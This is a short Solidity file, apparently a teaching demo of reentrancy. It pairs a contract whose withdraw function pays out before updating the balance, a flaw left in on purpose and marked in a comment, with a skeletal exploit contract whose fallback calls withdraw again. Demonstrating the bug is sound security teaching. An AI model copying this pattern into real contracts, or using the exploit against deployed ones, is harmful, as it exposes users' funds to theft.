// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract ReentrancyVuln {
    mapping(address => uint256) balances;

    function giveEth() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawEth() public {
        uint256 amountToWithdraw = balances[msg.sender];
        (bool success,) = payable(msg.sender).call{value: amountToWithdraw}("");
        require(success);
        // check effects fail
        balances[msg.sender] -= amountToWithdraw;
    }
}

contract ExploitReentrancy {


    fallback() external {
        (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));
    }
}
